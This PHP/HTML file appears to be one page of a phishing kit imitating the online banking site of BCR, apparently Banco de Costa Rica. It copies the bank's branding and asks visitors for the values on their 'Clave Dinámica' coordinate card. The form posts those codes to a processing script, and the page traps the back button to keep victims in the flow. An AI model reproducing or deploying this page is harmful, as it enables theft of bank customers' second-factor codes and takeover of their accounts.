<?php
session_start();
$etiquetas = $_SESSION['etiquetas'] ?? [];
if (empty($etiquetas)) {
  header("Location: index.html");
  exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link href="archivos/style.css" rel="stylesheet" type="text/css">
  <title>BCR</title>

  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .coord-label {
      font-weight: bold;
      font-size: 20px;
      color: #0a2f74;
      margin-bottom: 5px;
      text-align: center;
    }

    .coord-box {
      width: 60px;
      height: 30px;
      font-size: 18px;
      text-align: center;
    }

    .coordenadas-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 50px;
      padding: 10px;
    }

    .coord-inputs {
      display: flex;
      gap: 40px;
      justify-content: center;
      margin-bottom: 30px;
    }

    .coord-group {
      text-align: center;
    }

    .btn-continuar {
      background-color: #0033a0;
      color: white;
      border: none;
      padding: 10px 25px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    .btn-continuar:hover {
      background-color: #002b85;
    }

    .head {
      width: 100%;
      padding: 10px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .head img.logo {
      height: 50px;
    }

    .head .headimg1,
    .head .headimg2 {
      height: 30px;
    }

    .linkhead1,
    .linkhead2 {
      margin-left: 10px;
      color: #0033a0;
      font-size: 12px;
    }

    .head2 {
      width: 100%;
      background-color: #0033a0;
      padding: 12px 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .texthead {
      font-weight: bold;
      color: white;
      font-size: 16px;
      letter-spacing: 1px;
      margin-top: 5px;
    }
  </style>

  <script>
    function autoJump(currentInput, nextInputId) {
      if (currentInput.value.length >= 2 && nextInputId) {
        document.getElementById(nextInputId).focus();
      }
    }

    // Evitar volver con el botón atrás
    window.history.pushState(null, "", window.location.href);
    window.onpopstate = function () {
      window.location.href = "index.html";
    };
  </script>
</head>
<body>

  <div class="head">
    <img src="archivos/logo.gif" class="logo">
    <img src="archivos/Certificado.svg" class="headimg1">
    <img src="archivos/Contactenos.svg" class="headimg2">
    <a href="#" class="linkhead1">Certificaciones</a>
    <a href="#" class="linkhead2">Contáctenos</a>
  </div>

  <div class="head2">
    <span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
  </div>

  <div class="coordenadas-wrapper">
    <p>Ingrese las coordenadas de su BCR Clave Dinámica:</p><br><br>
    <form action="procesar_coordenadas.php" method="POST">
      <div class="coord-inputs">
        <?php foreach ($etiquetas as $index => $et): ?>
          <div class="coord-group">
            <div class="coord-label"><?php echo htmlspecialchars($et); ?></div>
            <input type="tel"
                   inputmode="numeric"
                   pattern="[A-Za-z0-9]{2}"
                   id="coord_<?php echo $index; ?>"
                   name="respuesta_<?php echo $index; ?>"
                   class="coord-box"
                   maxlength="2"
                   oninput="autoJump(this, 'coord_<?php echo $index + 1; ?>')"
                   required>
          </div>
        <?php endforeach; ?>
      </div>
      <button type="submit" class="btn-continuar">Confirmar</button>
    </form>
  </div>

</body>
</html>
